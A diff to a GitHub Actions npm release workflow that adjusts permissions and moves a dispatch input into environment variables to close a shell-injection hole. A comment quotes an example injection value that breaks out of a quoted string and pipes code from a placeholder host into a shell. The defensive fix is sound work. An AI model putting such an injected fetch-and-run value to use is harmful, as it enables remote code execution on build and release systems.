@@ -37,13 +37,19 @@ on:
         required: true
 
 permissions:
-  contents: read
+  # `contents: write` is required by `softprops/action-gh-release` to
+  # create the tag-aligned GitHub Release. Without this the workflow
+  # 403s on the final step AFTER `npm publish` has already succeeded
+  # — i.e. the package would land on npm but no Release/asset bundle
+  # would be cut. Self-review caught 2026-05-10 before the first
+  # publish attempt.
+  contents: write
   # OIDC token mint — required by sigstore/cosign keyless signing AND by
-  # npm's trusted-publisher exchange. id-token is the only sensitive
-  # permission; everything else stays at default (read).
+  # npm's trusted-publisher exchange. id-token is the sensitive
+  # permission of the bunch.
   id-token: write
   # Attestations for the build provenance (best practice for npm
-  # provenance + Sigstore).
+  # provenance + Sigstore + future `actions/attest-build-provenance`).
   attestations: write
 
 concurrency:
@@ -102,14 +108,25 @@ jobs:
         run: pnpm --filter @muhaven/mcp build
 
       - name: Version-match check
+        # Pass dispatch input via env (NOT inline `${{ }}` interpolation
+        # in a shell script) so a crafted version like
+        #   "; curl https://x | sh; #
+        # cannot break out of the double-quoted string. The env-var
+        # round-trip treats the input as data, not code. Self-review
+        # caught 2026-05-10. The GitHub Environment 2-reviewer gate
+        # already constrains who can dispatch, but the shell-injection
+        # anti-pattern is what Codex / a future security review would
+        # flag regardless of the upstream gate.
+        env:
+          GH_REF_NAME: ${{ github.ref_name }}
+          DISPATCH_VERSION: ${{ inputs.version }}
         run: |
           set -euo pipefail
           PKG=$(node -p "require('./packages/mcp/package.json').version")
           MAN=$(node -p "require('./packages/mcp/manifest.json').version")
           # Strip leading "mcp-v" from tag, or use the dispatch input.
-          TAG="${GITHUB_REF_NAME#mcp-v}"
-          DISPATCH_VERSION="${{ inputs.version }}"
-          if [ -n "$DISPATCH_VERSION" ]; then
+          TAG="${GH_REF_NAME#mcp-v}"
+          if [ -n "${DISPATCH_VERSION:-}" ]; then
             TAG="$DISPATCH_VERSION"
           fi
           if [ "$PKG" != "$MAN" ] || [ "$PKG" != "$TAG" ]; then
@@ -123,7 +140,11 @@ jobs:
         working-directory: packages/mcp
         run: |
           set -euo pipefail
-          TARBALL=$(npm pack --silent)
+          # `tail -n 1` is defensive: `npm pack --silent` today writes
+          # only the tarball filename to stdout, but a future npm could
+          # add warnings or notices. Mirrors openclaw-skill-publish.yml
+          # `pnpm pack --silent | tail -n 1`. Self-review nit 2026-05-10.
+          TARBALL=$(npm pack --silent | tail -n 1)
           echo "tarball=packages/mcp/$TARBALL" >> "$GITHUB_OUTPUT"
           echo "tarball-name=$TARBALL" >> "$GITHUB_OUTPUT"
 
